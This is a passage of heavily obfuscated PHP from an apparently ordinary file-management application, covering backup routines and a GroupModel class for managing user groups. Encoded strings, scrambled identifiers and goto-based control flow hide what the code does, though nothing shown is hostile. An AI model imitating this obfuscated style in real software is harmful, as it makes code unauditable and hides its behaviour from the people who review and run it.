strtotime("\55{$E†Š²ŞÒ±Ô}\40\x6d\x6f\x6e\x74\150\163")); } $f­ÆâíÇ½› = array_unique($f­ÆâíÇ½›); foreach ($A¯÷¹ÒÚ£‡ as $C¬êßõä¿ë) { if (!empty($C¬êßõä¿ë[$f´À²Ó§‘[28]]) && in_array($C¬êßõä¿ë[$f´À²Ó§‘[28]], $f­ÆâíÇ½›)) { continue; } Model($f´À²Ó§‘[676])->remove($C¬êßõä¿ë[$f´À²Ó§‘[363]]); $a‚„î•ó²İ = "\173\x69\x6f\x3a{$CÆ½©ñâ«Ï[$f´À²Ó§‘[679]]}\175\57\x64\x61\164\141\142\141\x73\x65\x2f\142\141\143\x6b\x75\x70\137{$C¬êßõä¿ë[$f´À²Ó§‘[28]]}"; IO::remove($a‚„î•ó²İ, !1); } goto D±»‘ôÒ²; D±»‘ôÒ²: } public function db() { goto BŠ…¥½ëÌ¨; dÜê®¯º³î: $aÈç‡Ü¢­ = new BackupDb(); if (!$aÈç‡Ü¢­->index()) { return !1; } self::set(array($dÆïÊÌé÷‘[695] => 1)); goto aö—ˆŠñÚ; BŠ…¥½ëÌ¨: $dÆïÊÌé÷‘ =& $_SERVER[»„]; $A½†ó³ÄÍÍ = self::get(); if ($A½†ó³ÄÍÍ[$dÆïÊÌé÷‘[277]][$dÆïÊÌé÷‘[682]][$dÆïÊÌé÷‘[677]] == $dÆïÊÌé÷‘[83]) { return !0; } goto dÜê®¯º³î; aö—ˆŠñÚ: return !0; goto D¬…ËÛ»´; D¬…ËÛ»´: } public function dbFile() { goto CŞ«ª‚Ê­ó; CŞ«ª‚Ê­ó: $få¨èç«Á¨ =& $_SERVER[»„]; $A“”ÏÓÓÎ = self::get(); if ($A“”ÏÓÓÎ[$få¨èç«Á¨[277]][$få¨èç«Á¨[685]][$få¨èç«Á¨[677]] == $få¨èç«Á¨[83]) { return !0; } goto cë‘ãìğ“Æ; cë‘ãìğ“Æ: $f‡ô³İ•¸‚ = new BackupDbFile(); if (!$f‡ô³İ•¸‚->index()) { return !1; } self::set(array($få¨èç«Á¨[696] => 1)); goto bê¨ŠÊŒÂù; bê¨ŠÊŒÂù: return !0; goto C É‹åøÜì; C É‹åøÜì: } public function file() { $b³ ¼¼İ =& $_SERVER[»„]; $Dš‘‹ÏŒÅ = self::get(); if ($Dš‘‹ÏŒÅ[$b³ ¼¼İ[277]][$b³ ¼¼İ[163]][$b³ ¼¼İ[677]] == $b³ ¼¼İ[83]) { return !0; } if (!isset($Dš‘‹ÏŒÅ[$b³ ¼¼İ[680]]) || $Dš‘‹ÏŒÅ[$b³ ¼¼İ[680]] == $b³ ¼¼İ[464]) { $f¾ïŠœ­® = new BackupFile(); if (!$f¾ïŠœ­®->index()) { return !1; } } self::set(array($b³ ¼¼İ[697] => 1, $b³ ¼¼İ[677] => 1)); return !0; } } goto eö¤‹Ëƒæ; B¯ÀØ¡×Ñù: class GroupModel extends ModelBase { protected $tableName = "\x67\162\157\165\x70"; protected $tableMeta = array("\x74\141\142\x6c\145\x4e\x61\x6d\x65" => "\x67\162\x6f\165\x70\137\155\x65\x74\141", "\x6d\x65\164\141\106\151\x65\154\144" => "\147\x72\157\165\x70\111\x44"); protected function cacheFunctionAlias($e½õ‚”ÀÁ) { $C±ùïÓÔò… =& $_SERVER[»„]; return array($C±ùïÓÔò…[2138] => array($e½õ‚”ÀÁ[0], $C±ùïÓÔò…[2139]), $C±ùïÓÔò…[2140] => array($e½õ‚”ÀÁ[0], $C±ùïÓÔò…[2139])); } protected function getInfo($f­¢éç¼‹‰) { $c¸Ôè‘³İ° = $this->getInfoSimple($f­¢éç¼‹‰); if (!$c¸Ôè‘³İ°) { return !1; } return $this->_listDataApplyItem($c¸Ôè‘³İ°); } protected function getInfoSimple($dˆ‘„ŒÍëí, $AÆŒ§á¼Ô = false) { $Dà‘¬²ñÃÎ =& $_SERVER[»„]; if ($AÆŒ§á¼Ô) { $FÌƒˆ÷ºÏ = array($Dà‘¬²ñÃÎ[2072] => intval($dˆ‘„ŒÍëí)); $c©ã¡Ò¸æ = $this->where($FÌƒˆ÷ºÏ)->find(); return is_array($c©ã¡Ò¸æ) ? $c©ã¡Ò¸æ : array(); } return $this->cacheFunctionGet($Dà‘¬²ñÃÎ[2141], $dˆ‘„ŒÍëí); } protected function groupAdd($f¥¶ºÛÀÌ¾) { goto eº°»±¬×Î; dùôËß©×Ò: Model($cƒœ‘Íˆœ’[1098])->groupRootAdd($C¬£¢…ëÎÇ); return $C¬£¢…ëÎÇ; goto cœ¬â„¢ ‘; a¢Ú¨°ô¶õ: if ($B¯¿£±’óÚ[$cƒœ‘Íˆœ’[455]]) { $E¯¦¸æÑ¦ê = $B¯¿£±’óÚ[$cƒœ‘Íˆœ’[455]] . $B¯¿£±’óÚ[$cƒœ‘Íˆœ’[2072]] . $cƒœ‘Íˆœ’[47]; } $dŞŸ¥î— = array($cƒœ‘Íˆœ’[382] => $this->groupNameAuto($f¥¶ºÛÀÌ¾[$cƒœ‘Íˆœ’[457]], $f¥¶ºÛÀÌ¾[$cƒœ‘Íˆœ’[28]]), $cƒœ‘Íˆœ’[364] => $f¥¶ºÛÀÌ¾[$cƒœ‘Íˆœ’[457]], $cƒœ‘Íˆœ’[521] => $E¯¦¸æÑ¦ê, $cƒœ‘Íˆœ’[2142] => $f¥¶ºÛÀÌ¾[$cƒœ‘Íˆœ’[2056]], $cƒœ‘Íˆœ’[2143] => 0, $cƒœ‘Íˆœ’[2076] => 0); if (isset($f¥¶ºÛÀÌ¾[$cƒœ‘Íˆœ’[2093]])) { $dŞŸ¥î—[$cƒœ‘Íˆœ’[2093]] = $f¥¶ºÛÀÌ¾[$cƒœ‘Íˆœ’[2093]]; } else { $eè±½ìªŒß = $this->max($cƒœ‘Íˆœ’[2093]); if (!$eè±½ìªŒß) { $eè±½ìªŒß = 0; } $dŞŸ¥î—[$cƒœ‘Íˆœ’[2093]] = $eè±½ìªŒß + 1; } goto c¸ØÌ·¯ß•; eº°»±¬×Î: $cƒœ‘Íˆœ’ =& $_SERVER[»„]; if (!$f¥¶ºÛÀÌ¾[$cƒœ‘Íˆœ’[457]] && isset($f¥¶ºÛÀÌ¾[$cƒœ‘Íˆœ’[2072]]) && $f¥¶ºÛÀÌ¾[$cƒœ‘Íˆœ’[2072]] == 1) { if ($B¯¿£±’óÚ = $this->getInfoSimple($f¥¶ºÛÀÌ¾[$cƒœ‘Íˆœ’[2072]], !0)) { return $f¥¶ºÛÀÌ¾[$cƒœ‘Íˆœ’[2072]]; } } else { $B¯¿£±’óÚ = $this->getInfoSimple($f¥¶ºÛÀÌ¾[$cƒœ‘Íˆœ’[457]]); if (!$B¯¿£±’óÚ) { return !1; } } $E¯¦¸æÑ¦ê = $cƒœ‘Íˆœ’[466]; goto a¢Ú¨°ô¶õ; c¸ØÌ·¯ß•: if (!empty($f¥¶ºÛÀÌ¾[$cƒœ‘Íˆœ’[2072]])) { $dŞŸ¥î—[$cƒœ‘Íˆœ’[2072]] = $f¥¶ºÛÀÌ¾[$cƒœ‘Íˆœ’[2072]]; } $C¬£¢…ëÎÇ = $this->add($dŞŸ¥î—); $this->setNamePinyin($C¬£¢…ëÎÇ, $dŞŸ¥î—[$cƒœ‘Íˆœ’[28]]); goto dùôËß©×Ò; cœ¬â„¢ ‘: } protected function groupEdit($Dæ¥œÜğ§Ê, $A÷è—Æˆ—§) { $C´®ø×¯…„ =& $_SERVER[»„]; if (!empty($A÷è—Æˆ—§[$C´®ø×¯…„[457]])) { $A¾Ÿ„ŞÆÒÆ = $this->getInfoSimple($Dæ¥œÜğ§Ê); $A„´Ğ†™ˆÂ = $this->getInfoSimple($A÷è—Æˆ—§[$C´®ø×¯…„[457]]); if (!$A¾Ÿ„ŞÆÒÆ || !$A„´Ğ†™ˆÂ) { return !1; } if ($A¾Ÿ„ŞÆÒÆ[$C´®ø×¯…„[2072]] == $A„´Ğ†™ˆÂ[$C´®ø×¯…„[2072]]) { return !1; } if ($A÷è—Æˆ—§[$C´®ø×¯…„[457]] != $A¾Ÿ„ŞÆÒÆ[$C´®ø×¯…„[457]]) { if ($A„´Ğ†™ˆÂ[$C´®ø×¯…„[455]] !== $A¾Ÿ„ŞÆÒÆ[$C´®ø×¯…„[455]] && strpos($A„´Ğ†™ˆÂ[$C´®ø×¯…„[455]], $A¾Ÿ„ŞÆÒÆ[$C´®ø×¯…„[455]] . $A¾Ÿ„ŞÆÒÆ[$C´®ø×¯…„[2072]] . $C´®ø×¯…„[47]) === 0) { return !1; } $A÷è—Æˆ—§[$C´®ø×¯…„[521]] = $A„´Ğ†™ˆÂ[$C´®ø×¯…„[455]] . $A÷è—Æˆ—§[$C´®ø×¯…„[457]] . $C´®ø×¯…„[47]; $this->_changeChildLevel($A¾Ÿ„ŞÆÒÆ, $A„´Ğ†™ˆÂ); } } if (isset($A÷è—Æˆ—§[$C´®ø×¯…„[28]])) { $this->setNamePinyin($Dæ¥œÜğ§Ê, $A÷è—Æˆ—§[$C´®ø×¯…„[28]]); } return $this->where(array($C´®ø×¯…„[2144] => $Dæ¥œÜğ§Ê))->save($A÷è—Æˆ—§); } private function _changeChildLevel($eÍÔµÉë° , $aÂÜƒ±»¼£, $B‘©âäÁÌÉ = false) { goto a£Œµ…ö¬; Fºñ¶ˆ±Œ‰: $this->where($f‰Ö›ù’äÛ)->data($cÈõ›èŒë‰)->save(); goto cÊ²™ˆŠİ; fàø¦…›º: if ($B‘©âäÁÌÉ) { $e¢ƒíÃŠÔ§ = $aÂÜƒ±»¼£[$F“Ø›“ÌÉ‡[455]] . $aÂÜƒ±»¼£[$F“Ø›“ÌÉ‡[2072]] . $F“Ø›“ÌÉ‡[47]; } $f‰Ö›ù’äÛ = array($F“Ø›“ÌÉ‡[521] => array($F“Ø›“ÌÉ‡[479], $eÍÔµÉë° [$F“Ø›“ÌÉ‡[455]] . $eÍÔµÉë° [$F“Ø›“ÌÉ‡[2072]] . $F“Ø›“ÌÉ‡[480])); $cÈõ›èŒë‰ = array($F“Ø›“ÌÉ‡[521] => array($F“Ø›“ÌÉ‡[530], "\x72\145\x70\x6c\x61\143\x65\x28\160\x61\162\145\x6e\x74\x4c\145\166\145\154\x2c\x27{$cªáºÁ¿ĞÅ}\x27\54\47{$e¢ƒíÃŠÔ§}\47\51")); goto Fºñ¶ˆ±Œ‰; a£Œµ…ö¬: $F“Ø›“ÌÉ‡ =& $_SERVER[»„]; $cªáºÁ¿ĞÅ = $eÍÔµÉë° [$F“Ø›“ÌÉ‡[455]] . $eÍÔµÉë° [$F“Ø›“ÌÉ‡[2072]] . $F“Ø›“ÌÉ‡[47]; $e¢ƒíÃŠÔ§ = $aÂÜƒ±»¼£[$F“Ø›“ÌÉ‡[455]] . $aÂÜƒ±»¼£[$F“Ø›“ÌÉ‡[2072]] . $F“Ø›“ÌÉ‡[47] . $eÍÔµÉë° [$F“Ø›“ÌÉ‡[2072]] . $F“Ø›“ÌÉ‡[47]; goto fàø¦…›º; cÊ²™ˆŠİ: } public function setNamePinyin($E†ò™¦Éá, $e¼°»Ë¿„ = false) { $Aê´—ÍˆÄŞ =& $_SERVER[»„]; if (!$e¼°»Ë¿„) { $FÀ‹«ˆß = $this->getInfoSimple($E†ò™¦Éá); $e¼°»Ë¿„ = $FÀ‹«ˆß[$Aê´—ÍˆÄŞ[28]]; } if (!Input::check($e¼°»Ë¿„, $Aê´—ÍˆÄŞ[524])) { $this->metaSet($E†ò™¦Éá, $Aê´—ÍˆÄŞ[412], null); $this->metaSet($E†ò™¦Éá, $Aê´—ÍˆÄŞ[411], null); return; } $cÕ—ŠÇïåæ = array($Aê´—ÍˆÄŞ[412] => str_replace($Aê´—ÍˆÄŞ[50], $Aê´—ÍˆÄŞ[33], Pinyin::encode($e¼°»Ë¿„)), $Aê´—ÍˆÄŞ[411] => Pinyin::encode($e¼°»Ë¿„, $Aê´—ÍˆÄŞ[525])); $this->metaSet($E†ò™¦Éá, $cÕ—ŠÇïåæ); } protected function groupStatus($cÑ„µÒ‘Ÿ, $F™ƒˆáõò¡, $fÈ•ÛÓçÎ = true) { $fÈ½ã˜ñÓß =& $_SERVER[»„]; $C„Ó§¢Íæ = $this->getInfoSimple($cÑ„µÒ‘Ÿ); if (!$C„Ó§¢Íæ) { return !1; } if ($fÈ•ÛÓçÎ) { $this->_groupStatusApply($C„Ó§¢Íæ, $F™ƒˆáõò¡); } $DŒ¯íÒìÓ„ = array($fÈ½ã˜ñÓß[2072] => $cÑ„µÒ‘Ÿ, $fÈ½ã˜ñÓß[89] => $fÈ½ã˜ñÓß[677], $fÈ½ã˜ñÓß[355] => $F™ƒˆáõò¡); return Model($fÈ½ã˜ñÓß[2145])->add($DŒ¯íÒìÓ„, array(), !0); } private function _groupStatusApply($bõ çì¾», $EïØê¼ó¡Ë) { $EñÉÛ¿ˆ¯Ã =& $_SERVER[»„]; if ($EïØê¼ó¡Ë == $EñÉÛ¿ˆ¯Ã[83]) { $DˆÇ’ƒ¹ôŒ = $this->parentLevelArray($bõ çì¾»[$EñÉÛ¿ˆ¯Ã[455]]); } else { $fÓ‚®‡³Ÿ = array($EñÉÛ¿ˆ¯Ã[521] => array($EñÉÛ¿ˆ¯Ã[479], $bõ çì¾»[$EñÉÛ¿ˆ¯Ã[455]] . $bõ çì¾»[$EñÉÛ¿ˆ¯Ã[2072]] . $EñÉÛ¿ˆ¯Ã[480])); $DˆÇ’ƒ¹ôŒ = $this->where($fÓ‚®‡³Ÿ)->field($EñÉÛ¿ˆ¯Ã[2072])->select(); $DˆÇ’ƒ¹ôŒ = array_to_keyvalue($DˆÇ’ƒ¹ôŒ, $EñÉÛ¿ˆ¯Ã[33], $EñÉÛ¿ˆ¯Ã[2072]); } if (empty($DˆÇ’ƒ¹ôŒ)) { return; } $fÓ‚®‡³Ÿ = array($EñÉÛ¿ˆ¯Ã[2072] => array($EñÉÛ¿ˆ¯Ã[7], $DˆÇ’ƒ¹ôŒ), $EñÉÛ¿ˆ¯Ã[89] => $EñÉÛ¿ˆ¯Ã[677], $EñÉÛ¿ˆ¯Ã[355] => $EïØê¼ó¡Ë ? $EñÉÛ¿ˆ¯Ã[464] : $EñÉÛ¿ˆ¯Ã[83]); Model($EñÉÛ¿ˆ¯Ã[2145])->where($fÓ‚®‡³Ÿ)->save(array($EñÉÛ¿ˆ¯Ã[355] => $EïØê¼ó¡Ë)); } protected function groupRemove($cùˆ¹Ïš¿) { goto fä’†¾ŸÓ; A ß“îÛ÷³: $this->where(array($eëğøÖˆä­[457] => $cùˆ¹Ïš¿))->save(array($eëğøÖˆä­[457] => $B›ïİ¼ÚŠ[$eëğøÖˆä­[457]])); Model($eëğøÖˆä­[2145])->where($bšÛØâÑ¬ï)->delete(); Model($eëğøÖˆä­[2146])->where($bšÛØâÑ¬ï)->delete(); goto C¾ó¥—×Ú; fä’†¾ŸÓ: $eëğøÖˆä­ =& $_SERVER[»„]; $bšÛØâÑ¬ï = array($eëğøÖˆä­[2072] => $cùˆ¹Ïš¿); $B›ïİ¼ÚŠ = $this->where($bšÛØâÑ¬ï)->find(); goto FÎŒ±¹°; FÎŒ±¹°: if (!$B›ïİ¼ÚŠ || $B›ïİ¼ÚŠ[$eëğøÖˆä­[457]] == 0) { return !1; } $c×°ñƒŠõ‡ = $this->getInfoSimple($B›ïİ¼ÚŠ[$eëğøÖˆä­[457]]); $this->_changeChildLevel($B›ïİ¼ÚŠ, $c×°ñƒŠõ‡, !0); goto A ß“îÛ÷³; C¾ó¥—×Ú: Model($eëğøÖˆä­[740])->groupRootRemove($cùˆ¹Ïš¿); return $this->where($bšÛØâÑ¬ï)->delete(); goto D»ö»É¨­Ù; D»ö»É¨­Ù: } public function listData() { $Båî½×­¸© = $this->_makeOrder()->selectPage(50); $this->_listDataApply($Båî½×­¸©[$_SERVER[»„][350]]); return $Båî½×­¸©; } private function _makeOrder($d¯·ŸÎ½òî = '') { goto b™ÄîÅ”ôß; aµ¥«¨”í: $aõÛÉ = Input::get($f¬£¸òá›[403], $f¬£¸òá›[7], $f¬£¸òá›[2076], $c’òö²õ¯Ü); $eæ°¤ãÁç = Input::get($f¬£¸òá›[404], $f¬£¸òá›[7], $f¬£¸òá›[2147], array($f¬£¸òá›[2147], $f¬£¸òá›[400])); $eæ°¤ãÁç = $b×Í§¥í¡‹[$eæ°¤ãÁç]; goto Aé¬Ğ«£†; b™ÄîÅ”ôß: $f¬£¸òá› =& $_SERVER[»„]; $c’òö²õ¯Ü = array($f¬£¸òá›[2072], $f¬£¸òá›[28], $f¬£¸òá›[2058], $f¬£¸òá›[183]); $b×Í§¥í¡‹ = array($f¬£¸òá›[398] => $f¬£¸òá›[399], $f¬£¸òá›[400] => $f¬£¸òá›[401]); goto aµ¥«¨”í; Aé¬Ğ«£†: $d¯·ŸÎ½òî = $d¯·ŸÎ½òî . "{$aõÛÉ}\x20{$eæ°¤ãÁç}\x2c\x20\147\162\157\165\x70\111\104\x20\x61\163\143"; return $this->order($d¯·ŸÎ½òî); goto F½Ì–´¯éÅ; F½Ì–´¯éÅ: } public function listChild($D±µ¼Û’ø) { $eó·É°šƒô =& $_SERVER[»„]; $aæé¯£¾è = $this->where(array($eó·É°šƒô[457] => $D±µ¼Û’ø))->_makeOrder()->selectPage(200); $this->_listDataApply($aæé¯£¾è[$eó·É°šƒô[350]]); return $aæé¯£¾è; } public function listByID($AÚŠÃèšñ˜) { $D©™¸”Íµ =& $_SERVER[»„]; if (!$AÚŠÃèšñ˜) { return array(); } $Aòôî®¼¢ø = array($D©™¸”Íµ[2072] => array($D©™¸”Íµ[7], $AÚŠÃèšñ˜)); $Dãñ˜¤‚ÒŸ = $this->where($Aòôî®¼¢ø)->select(); $this->_listDataApply($Dãñ˜¤‚ÒŸ); return $Dãñ˜¤‚ÒŸ; } public function listSearch($aÑ­·Á¿¿¿) { goto c¿ˆŸù¾è; Eê’åÏ¬î: $this->_listDataApply($B¹ìİ˜‚›[$fôñ›´Û®ƒ[350]]); return $B¹ìİ˜‚›; goto bâåøÔ‘”Ç; A«±Åå‰› : $B¹ìİ˜‚› = $this->_makeOrder()->where($AóÌË™¤áô)->selectPage(20); $B¹ìİ˜‚› = $B¹ìİ˜‚› ? $B¹ìİ˜‚› : array(); if (!$B¹ìİ˜‚› || count($B¹ìİ˜‚›[$fôñ›´Û®ƒ[350]]) < 5 && Input::check($e¥ã‰‡¿¯, $fôñ›´Û®ƒ[302])) { $aùØ…­ºÜ = $this->_searchFromMeta($fôñ›´Û®ƒ[411], $e¥ã‰‡¿¯, 10); $b–ÅÂº†ÜÆ = $this->_searchFromMeta($fôñ›´Û®ƒ[412], $e¥ã‰‡¿¯, 10); $B¿àµ‡´¼ê = array_merge($aùØ…­ºÜ, $b–ÅÂº†ÜÆ, $B¹ìİ˜‚›[$fôñ›´Û®ƒ[350]]); $B¹ìİ˜‚›[$fôñ›´Û®ƒ[350]] = array_unique_by_key($B¿àµ‡´¼ê, $fôñ›´Û®ƒ[2072]); $B¹ìİ˜‚›[$fôñ›´Û®ƒ[347]][$fôñ›´Û®ƒ[348]] = count($B¹ìİ˜‚›[$fôñ›´Û®ƒ[350]]); $B¹ìİ˜‚›[$fôñ›´Û®ƒ[347]][$fôñ›´Û®ƒ[349]] = ceil($B¹ìİ˜‚›[$fôñ›´Û®ƒ[347]][$fôñ›´Û®ƒ[348]] / $B¹ìİ˜‚›[$fôñ›´Û®ƒ[347]][$fôñ›´Û®ƒ[345]]); } goto Eê’åÏ¬î; d˜ƒÚË¯à¬: if (!trim($e¥ã‰‡¿¯)) { return !1; } $e¥ã‰‡¿¯ = str_replace($fôñ›´Û®ƒ[2150], $fôñ›´Û®ƒ[2151], $e¥ã‰‡¿¯); $AóÌË™¤áô = array($fôñ›´Û®ƒ[2072] => array($fôñ›´Û®ƒ[739], "\x25{$e¥ã‰‡¿¯}\45"), $fôñ›´Û®ƒ[28] => array($fôñ›´Û®ƒ[739], "\x25{$e¥ã‰‡¿¯}\x25"), $fôñ›´Û®ƒ[904] => $fôñ›´Û®ƒ[2152]); goto A«±Åå‰› ; c¿ˆŸù¾è: $fôñ›´Û®ƒ =& $_SERVER[»„]; $e¥ã‰‡¿¯ = $aÑ­·Á¿¿¿[$fôñ›´Û®ƒ[2148]]; $a°Ó„ˆ³„ó = isset($aÑ­·Á¿¿¿[$fôñ›´Û®ƒ[2149]]) ? $aÑ­·Á¿¿¿[$fôñ›´Û®ƒ[2149]] : !1; goto d˜ƒÚË¯à¬; bâåøÔ‘”Ç: } private function _searchFromMeta($b‰»Ÿ¸Ó½‰, $d£ª™†ÅŞ‚, $cÙ±£†·ÏŒ) { goto d‰ñ»ê›¾; Eè²Êğ¹™¢: $FŒÕ„¦Ğ³Ö = Model($f¬«‡»¤ˆ[2153])->where($c¨‰Õ…ĞŞ)->limit($cÙ±£†·ÏŒ)->select(); if (!$FŒÕ„¦Ğ³Ö) { return array(); } $FŒÕ„¦Ğ³Ö = array_to_keyvalue($FŒÕ„¦Ğ³Ö, $f¬«‡»¤ˆ[33], $f¬«‡»¤ˆ[2072]); goto EóÔ¤ô¹©Ù; d‰ñ»ê›¾: $f¬«‡»¤ˆ =& $_SERVER[»„]; $d£ª™†ÅŞ‚ = strtolower($d£ª™†ÅŞ‚); $c¨‰Õ…ĞŞ = array($f¬«‡»¤ˆ[89] => $b‰»Ÿ¸Ó½‰, $f¬«‡»¤ˆ[355] => array($f¬«‡»¤ˆ[739], "\45{$d£ª™†ÅŞ‚}\x25")); goto Eè²Êğ¹™¢; EóÔ¤ô¹©Ù: $AŒ¾»æ®‹ = $this->where(array($f¬«‡»¤ˆ[2144] => array($f¬«‡»¤ˆ[7], $FŒÕ„¦Ğ³Ö)))->select(); if (!$AŒ¾»æ®‹) { return array(); } return $AŒ¾»æ®‹; goto f—‹Şª£ªë; f—‹Şª£ªë: } protected function _listDataApplyItem($dÛÒ¶Œ¢¿í) { $C™êÑÂë¢„ = array($dÛÒ¶Œ¢¿í); $this->_listDataApply($C™êÑÂë¢„); return $C™êÑÂë¢„[0]; } protected function _listDataApply(&$d¼„ê…Ã ›) { goto C”¥Í™Â½¨; câ‘èÀ«é: $this->_listAppendChildren($d¼„ê…Ã ›); $this->_listAppendChildrenMember($d¼„ê…Ã ›); $this->_listAppendMeta($d¼„ê…Ã ›, $b¨ŠìÙÊÀ); goto f™–ë½«¨‚; C”¥Í™Â½¨: $EõùíÎø­‹ =& $_SERVER[»„]; if (!$d¼„ê…Ã ›) { return; } $b¨ŠìÙÊÀ = array_to_keyvalue($d¼„ê…Ã ›, $EõùíÎø­‹[33], $EõùíÎø­‹[2072]); goto câ‘èÀ«é; f™–ë½«¨‚: $this->_listAppendParent($d¼„ê…Ã ›); $this->_listAppendSourceRoot($d¼„ê…Ã ›, $b¨ŠìÙÊÀ); goto A‡çƒ´ëçª; A‡çƒ´ëçª: } private function _listAppendChildren(&$CŸĞ–Üä¸ë) { goto C©•¯‹Áá; Cò†ğ‚‰î¼: $Bé–‹Õ = array_to_keyvalue($Bé–‹Õ, $d¤äï«ëÎ›[446]); foreach ($CŸĞ–Üä¸ë as &$d„ùß‚…™±) { $d„ùß‚…™±[$d¤äï«ëÎ›[2154]] = isset($Bé–‹Õ[$d„ùß‚…™±[$d¤äï«ëÎ›[2072]] . $d¤äï«ëÎ›[2155]]); } goto a¬…«…ŠÅË; bç´ë±öã: $AõœÇÉÍÚÎ = count($CŸĞ–Üä¸ë); $Eá„ÁĞ¶°œ = $this->tablePrefix . $this->tableName; for ($f…Ğ’’ˆîİ = 0, $CÒ˜²Øø»Ÿ = 0; $f…Ğ’’ˆîİ < $AõœÇÉÍÚÎ; $f…Ğ’’ˆîİ++) { $CÒ˜²Øø»Ÿ++; $dºä‘­´’¶ = $CŸĞ–Üä¸ë[$f…Ğ’’ˆîİ][$d¤äï«ëÎ›[2072]]; $Câ¾¼Ø¡¡— .= "\x53\105\x4c\x45\103\124\40\x2a\40\x46\122\x4f\x4d\x20\x28\123\x45\x4c\x45\103\124\x20\47{$dºä‘­´’¶}\137\143\150\151\154\x64\47\40\141\x73\40\150\141\x73\40\106\122\x4f\x4d\x20\140{$Eá„ÁĞ¶°œ}\140\x20\x77\x68\145\162\145\x20\160\141\162\145\x6e\164\111\x44\x3d{$dºä‘­´’¶}\40\x6c\x69\155\x69\x74\x20\61\x29\x20\x61\163\x20\164\142\x5f{$dºä‘­´’¶}\40\165\156\x69\157\x6e\x20\141\154\154\x20"; if (($CÒ˜²Øø»Ÿ >= 20 || $f…Ğ’’ˆîİ == $AõœÇÉÍÚÎ - 1) && $Câ¾¼Ø¡¡—) { $Câ¾¼Ø¡¡— = substr($Câ¾¼Ø¡¡—, 0, -strlen($d¤äï«ëÎ›[445])); $EÓ–ŠàëİÄ = $this->query($Câ¾¼Ø¡¡—); $Bé–‹Õ = array_merge($Bé–‹Õ, $EÓ–ŠàëİÄ); $CÒ˜²Øø»Ÿ = 0; $Câ¾¼Ø¡¡— = $d¤äï«ëÎ›[33]; } } goto Cò†ğ‚‰î¼; C©•¯‹Áá: $d¤äï«ëÎ› =& $_SERVER[»„]; $Câ¾¼Ø¡¡— = $d¤äï«ëÎ›[357]; $Bé–‹Õ = array(); goto bç´ë±öã; a¬…«…ŠÅË: } private function _listAppendChildrenMember(&$EºË¤Ú®‡ï) { goto C½¹½òÀªª; C½¹½òÀªª: $aÊ ®¡—› =& $_SERVER[»„]; $BƒÒêñË’ = $aÊ ®¡—›[357]; $aÛ«°¸‹¿´ = array(); goto c¦ÆÇŸ£²Ğ; c¦ÆÇŸ£²Ğ: $cÛ‰ÂÑ—ÒÏ = count($EºË¤Ú®‡ï); $e°‰ˆ–ƒ¤° = $this->tablePrefix . $aÊ ®¡—›[2146]; for ($CöÄŸãÓƒ = 0, $F©ŞŞ„È×ù = 0; $CöÄŸãÓƒ < $cÛ‰ÂÑ—ÒÏ; $CöÄŸãÓƒ++) { $F©ŞŞ„È×ù++; $cÈÃĞ“… = $EºË¤Ú®‡ï[$CöÄŸãÓƒ][$aÊ ®¡—›[2072]]; $BƒÒêñË’ .= "\123\x45\x4c\105\103\x54\x20\x2a\40\x46\122\117\x4d\40\50\123\x45\114\x45\x43\124\x20\47{$cÈÃĞ“…}\x5f\143\x68\x69\x6c\x64\x27\x20\141\163\x20\150\141\163\x20\106\x52\117\x4d\x20\x60{$e°‰ˆ–ƒ¤°}\x60\x20\167\150\x65\x72\x65\x20\x67\162\x6f\x75\160\111\104\75{$cÈÃĞ“…}\x20\x6c\151\155\151\x74\40\61\x29\x20\141\x73\40\164\x62\x5f{$cÈÃĞ“…}\x20\x75\x6e\151\157\x6e\x20\141\x6c\x6c\40"; if (($F©ŞŞ„È×ù >= 20 || $CöÄŸãÓƒ == $cÛ‰ÂÑ—ÒÏ - 1) && $BƒÒêñË’) { $BƒÒêñË’ = substr($BƒÒêñË’, 0, -strlen($aÊ ®¡—›[445])); $ešŒŒ“¡İ± = $this->query($BƒÒêñË’); $aÛ«°¸‹¿´ = array_merge($aÛ«°¸‹¿´, $ešŒŒ“¡İ±); $F©ŞŞ„È×ù = 0; $BƒÒêñË’ = $aÊ ®¡—›[33]; } } goto CÖ“áÍâÄ±; CÖ“áÍâÄ±: $aÛ«°¸‹¿´ = array_to_keyvalue($aÛ«°¸‹¿´, $aÊ ®¡—›[446]); foreach ($EºË¤Ú®‡ï as &$BôÅÑ¥„î¢) { $BôÅÑ¥„î¢[$aÊ ®¡—›[2156]] = isset($aÛ«°¸‹¿´[$BôÅÑ¥„î¢[$aÊ ®¡—›[2072]] . $aÊ ®¡—›[2155]]); } goto dâÏé‡‹£§; dâÏé‡‹£§: } private function _listAppendMeta(&$B ê †È¡, $eØ³ä‘¦‹ ) { $bÛèÒ†ó–Ğ =& $_SERVER[»„]; $fìÃóï•ËÂ = array($bÛèÒ†ó–Ğ[2072] => array($bÛèÒ†ó–Ğ[7], $eØ³ä‘¦‹ )); $e‚»çÂ»Ë† = Model($bÛèÒ†ó–Ğ[2145])->where($fìÃóï•ËÂ)->select(); $e‚»çÂ»Ë† = array_to_keyvalue_group($e‚»çÂ»Ë†, $bÛèÒ†ó–Ğ[2072]); foreach ($e‚»çÂ»Ë† as &$fÙÄËĞÍóá) { $fÙÄËĞÍóá = array_to_keyvalue($fÙÄËĞÍóá, $bÛèÒ†ó–Ğ[89], $bÛèÒ†ó–Ğ[355]); } foreach ($B ê †È¡ as &$bªÙ°·†ˆ) { $bªÙ°·†ˆ[$bÛèÒ†ó–Ğ[413]] = array(); if (isset($e‚»çÂ»Ë†[$bªÙ°·†ˆ[$bÛèÒ†ó–Ğ[2072]]])) { $bªÙ°·†ˆ[$bÛèÒ†ó–Ğ[413]] = $e‚»çÂ»Ë†[$bªÙ°·†ˆ[$bÛèÒ†ó–Ğ[2072]]]; } } } protected function parentLevelArray($d‘‰‰áØÄ) { $DÂ²¡Ï„é‡ =& $_SERVER[»„]; $d‘‰‰áØÄ = explode($DÂ²¡Ï„é‡[47], trim($d‘‰‰áØÄ, $DÂ²¡Ï„é‡[47])); $d‘‰‰áØÄ = array_remove_value($d‘‰‰áØÄ, $DÂ²¡Ï„é‡[464]); return $d‘‰‰áØÄ; } private function _listAppendParent(&$fÖ­ÔØ”õ¯) { goto e¶£„±‘ö; C¤ĞÏ»è¶: foreach ($fÖ­ÔØ”õ¯ as &$bòìÃïŞÈ) { $D«Ğ‰­ªÁ‚ = $this->parentLevelArray($bòìÃïŞÈ[$bøÊ‚ñ•Ñ”[455]]); $b‹‡“¢‡ = $bøÊ‚ñ•Ñ”[33]; foreach ($D«Ğ‰­ªÁ‚ as $F…Ù‡Ïè¼») { $b‹‡“¢‡ .= 